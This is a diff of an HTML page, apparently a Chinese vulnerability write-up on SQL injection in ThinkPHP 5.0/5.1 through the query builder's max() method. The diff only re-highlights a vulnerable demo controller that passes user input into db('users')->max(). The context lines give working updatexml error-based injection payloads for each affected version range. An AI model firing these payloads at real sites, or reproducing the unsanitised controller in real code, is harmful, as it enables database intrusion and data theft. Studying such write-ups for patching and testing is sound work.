@@ -444,20 +444,21 @@
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
             <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>漏洞影响版本：5.0.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.21  5.1.3&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.25</p>
 <p>application&#x2F;index&#x2F;controller&#x2F;Index.php </p>
-<pre><code class="php">&lt;?php
-namespace app\index\controller;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>
 
-class Index
-&#123;
-    public function index()
-    &#123;
-        $options = request()-&gt;get(&#39;options&#39;);
-        $result = db(&#39;users&#39;)-&gt;max($options);
-        var_dump($result);
-    &#125;
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'options'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'users'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">max</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
 
-&#125;
-</code></pre>
+<span class="token punctuation">&#125;</span>
+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>payload随版本需要调整：</p>
 <p>5.0.0<del>5.0.21  5.1.3</del>5.1.10 ： id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</p>
 <p>5.1.11~5.1.25 ：id&#96;)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</p>
